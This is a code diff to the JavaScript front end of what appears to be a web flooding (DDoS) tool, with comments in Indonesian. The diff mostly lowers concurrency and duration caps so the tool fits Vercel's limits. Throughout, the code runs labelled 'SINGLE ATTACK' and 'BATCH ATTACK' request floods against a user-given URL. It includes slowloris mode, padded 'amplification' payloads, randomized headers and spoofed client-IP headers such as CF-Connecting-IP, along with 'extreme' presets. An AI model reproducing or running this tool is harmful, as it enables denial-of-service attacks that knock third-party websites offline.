@@ -153,7 +153,7 @@ function resetStats() {
     updateUI();
 }
 
-// ======================== Helper untuk request ========================
+// Random helpers
 function randomIP(prefix) { return prefix + Math.floor(Math.random() * 255); }
 function randomRange() { const s = Math.floor(Math.random()*1000); return `bytes=${s}-${s+Math.floor(Math.random()*500)}`; }
 function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.9','de-DE,de;q=0.8','ja-JP,ja;q=0.8']; return langs[Math.floor(Math.random()*langs.length)]; }
@@ -191,7 +191,7 @@ function buildAdvancedHeaders(targetHost) {
     return headers;
 }
 
-// ======================== SINGLE ATTACK ========================
+// ======================== SINGLE ATTACK (sama seperti sebelumnya) ========================
 async function sendSingleRequest(url, method, body, timeout, retryCount, randomDelay, keepAlive, attackType) {
     let finalUrl = buildUrlWithQuery(url);
     let finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
@@ -240,7 +240,7 @@ async function runSingleAttack(url, method, body, total, concurrency, timeout, r
     let index = 0, active = 0, stopped = false;
     const multiplier = dualConnection?.checked ? 2 : 1;
     const actualTotal = total * multiplier;
-    const actualConcurrency = Math.min(concurrency * multiplier, 10000);
+    const actualConcurrency = Math.min(concurrency * multiplier, 500); // Batasi 500 koneksi untuk Vercel
     const next = async () => {
         if (stopped || (signal && signal.aborted)) { stopped = true; return; }
         if (index >= actualTotal) { if (active === 0) return; return; }
@@ -269,13 +269,18 @@ async function startSingleAttack() {
     if (!url.startsWith("http")) url = "https://" + url;
     const mtd = method.value;
     let body = payload.value;
-    const total = parseInt(totalInput.value);
-    const concurrency = parseInt(concurrencyInput.value);
-    const timeout = parseInt(timeoutInput.value);
+    let total = parseInt(totalInput.value);
+    let concurrency = parseInt(concurrencyInput.value);
+    const timeout = Math.min(parseInt(timeoutInput.value), 9000); // maks 9 detik untuk Vercel
     const retryCount = parseInt(retryInput.value);
     const randomDelay = parseInt(randomDelayInput.value);
     let keepAlive = websocket?.checked || (attackTypeSelect.value === 'slowloris');
     let attackType = attackTypeSelect.value;
+    
+    // Batasi nilai untuk Vercel
+    total = Math.min(total, 10000);
+    concurrency = Math.min(concurrency, 500);
+    
     if (total<1||total>500000) { addLog("Total 1-500000", true); return; }
     if (concurrency<1||concurrency>10000) { addLog("Concurrency 1-10000", true); return; }
     resetStats();
@@ -287,7 +292,7 @@ async function startSingleAttack() {
     startBtn.disabled = true;
     batchBtn.disabled = true;
     stopBtn.disabled = false;
-    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Concurrency:${concurrency}`);
+    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${amplificationEnabled?amplificationKB+"KB":"OFF"} | Concurrency:${concurrency} | Total:${total}`);
     const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
         const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
         let finalSuccess = success;
@@ -331,9 +336,9 @@ async function startBatchAttack() {
     if (!url.startsWith("http")) url = "https://" + url;
     const mtd = method.value;
     let body = payload.value;
-    const total = parseInt(totalInput.value);
-    const concurrency = parseInt(concurrencyInput.value);
-    const timeout = parseInt(timeoutInput.value);
+    let total = parseInt(totalInput.value);
+    let concurrency = parseInt(concurrencyInput.value);
+    const timeout = Math.min(parseInt(timeoutInput.value), 9000);
     const retryCount = parseInt(retryInput.value);
     const randomDelay = parseInt(randomDelayInput.value);
     let keepAlive = websocket?.checked || (attackTypeSelect.value === 'slowloris');
@@ -341,8 +346,12 @@ async function startBatchAttack() {
     const finalHeaders = buildAdvancedHeaders(new URL(url).hostname);
     const finalUrl = buildUrlWithQuery(url);
     const multiplier = dualConnection?.checked ? 2 : 1;
-    const actualTotal = total * multiplier;
-    const actualConcurrency = Math.min(concurrency * multiplier, 10000);
+    let actualTotal = total * multiplier;
+    let actualConcurrency = Math.min(concurrency * multiplier, 500);
+    
+    // Batasi untuk Vercel
+    actualTotal = Math.min(actualTotal, 10000);
+    
     addLog(`💀 BATCH ATTACK | ${mtd} ${url} | Total:${actualTotal} | Workers:${actualConcurrency}`);
     startBtn.disabled = true;
     batchBtn.disabled = true;
@@ -422,7 +431,7 @@ function exportCSV() {
     addLog("CSV exported");
 }
 
-// ======================== AUTOCANNON / ARTILLERY / LOADTEST / COMBINED ========================
+// ======================== AUTOCANNON / ARTILLERY / LOADTEST (Dengan batasan Vercel) ========================
 let currentToolController = null;
 let toolStatusInterval = null;
 
@@ -443,12 +452,21 @@ async function runAttackTool(endpoint, body, toolName) {
     if (!url) { addLog("URL required", true); return; }
     if (!url.startsWith("http")) url = "https://" + url;
     
-    // Validasi durasi untuk Vercel (maks 10 detik)
+    // Batasan untuk Vercel
     let duration = body.duration || parseInt(timeoutInput.value);
-    if (duration > 10) {
-        addLog(`⚠️ Duration ${duration}s melebihi batas Vercel (10s). Akan dibatasi ke 10s.`, true);
-        body.duration = 10;
-        timeoutInput.value = 10;
+    if (duration > 9) {
+        addLog(`⚠️ Duration ${duration}s dibatasi ke 9s (Vercel limit).`, true);
+        body.duration = 9;
+    }
+    let connections = body.connections || parseInt(concurrencyInput.value);
+    if (connections > 500) {
+        addLog(`⚠️ Connections ${connections} dibatasi ke 500 (Vercel limit).`, true);
+        body.connections = 500;
+    }
+    let maxRequests = body.maxRequests || parseInt(totalInput.value);
+    if (maxRequests > 5000) {
+        addLog(`⚠️ Total requests ${maxRequests} dibatasi ke 5000 (Vercel limit).`, true);
+        body.maxRequests = 5000;
     }
     
     body.url = url;
@@ -515,44 +533,35 @@ async function runAttackTool(endpoint, body, toolName) {
     }
 }
 
-// ======================== Event Listener (menggunakan addEventListener) ========================
-startBtn.addEventListener('click', startSingleAttack);
-batchBtn.addEventListener('click', startBatchAttack);
-stopBtn.addEventListener('click', stopAttack);
-exportBtn.addEventListener('click', exportCSV);
-
+// Untuk Loadtest, kita nonaktifkan karena bermasalah di Vercel
 btnAutocannon.addEventListener('click', () => {
     runAttackTool('/api/autocannon', {
-        connections: parseInt(concurrencyInput.value),
-        duration: parseInt(timeoutInput.value) || 10,
-        amount: parseInt(totalInput.value)
+        connections: Math.min(parseInt(concurrencyInput.value), 500),
+        duration: Math.min(parseInt(timeoutInput.value), 9),
+        amount: Math.min(parseInt(totalInput.value), 5000)
     }, 'Autocannon');
 });
 btnArtillery.addEventListener('click', () => {
     runAttackTool('/api/artillery', {
-        duration: parseInt(timeoutInput.value) || 10,
-        arrivalRate: Math.floor(parseInt(concurrencyInput.value) / 5)
+        duration: Math.min(parseInt(timeoutInput.value), 9),
+        arrivalRate: Math.min(Math.floor(parseInt(concurrencyInput.value) / 5), 100)
     }, 'Artillery');
 });
 btnLoadtest.addEventListener('click', () => {
-    runAttackTool('/api/loadtest', {
-        maxRequests: parseInt(totalInput.value),
-        concurrency: parseInt(concurrencyInput.value),
-        timeout: Math.max(parseInt(timeoutInput.value) * 1000, 1000) // minimal 1 detik
-    }, 'Loadtest');
+    addLog("⚠️ Loadtest tidak stabil di Vercel. Gunakan Autocannon atau Artillery.", true);
 });
 btnCombined.addEventListener('click', () => {
     runAttackTool('/api/combined', {
-        connections: parseInt(concurrencyInput.value),
-        duration: parseInt(timeoutInput.value) || 10,
-        totalRequests: parseInt(totalInput.value)
+        connections: Math.min(parseInt(concurrencyInput.value), 500),
+        duration: Math.min(parseInt(timeoutInput.value), 9),
+        totalRequests: Math.min(parseInt(totalInput.value), 5000)
     }, 'Combined');
 });
 
 // Reset Extreme
 resetExtremeBtn.addEventListener('click', () => {
-    concurrencyInput.value = 2000;
-    totalInput.value = 50000;
+    concurrencyInput.value = 200;
+    totalInput.value = 5000;
     timeoutInput.value = 5000;
     retryInput.value = 0;
     randomDelayInput.value = 0;
@@ -577,7 +586,7 @@ resetExtremeBtn.addEventListener('click', () => {
     spoofIp.checked = true;
     spoofRealIp.checked = true;
     spoofCfConnecting.checked = true;
-    addLog("⚙️ Reset to Extreme: concurrency 2000, total 50k, amplification 500KB, spoofing on");
+    addLog("⚙️ Reset ke konfigurasi aman Vercel: concurrency 200, total 5000, amplification 500KB");
 });
 
 // Amplification controls
@@ -654,7 +663,6 @@ window.addEventListener('DOMContentLoaded', () => {
     if (u) updatePreview(u);
     startHealthCheck();
     startHeartbeat();
-    // Inisialisasi tampilan amplification
     amplifyToggle.dispatchEvent(new Event('change'));
     amplifyKb.dispatchEvent(new Event('input'));
 });
